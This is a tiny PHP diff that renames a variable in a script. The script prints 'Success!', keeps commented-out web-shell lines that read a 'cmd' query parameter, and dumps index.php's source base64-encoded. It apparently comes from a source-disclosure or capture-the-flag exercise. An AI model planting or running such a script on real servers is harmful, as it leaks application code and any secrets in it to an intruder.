@@ -2,7 +2,7 @@
   echo("Success!\n");
   //$command = $_GET['cmd'];
   //echo $command."\n";
-  $file = file_get_contents("index.php");
-  echo base64_encode($file);
+  $infile = file_get_contents("index.php");
+  echo base64_encode($infile);
   //show_source(__FILE__);
 ?>
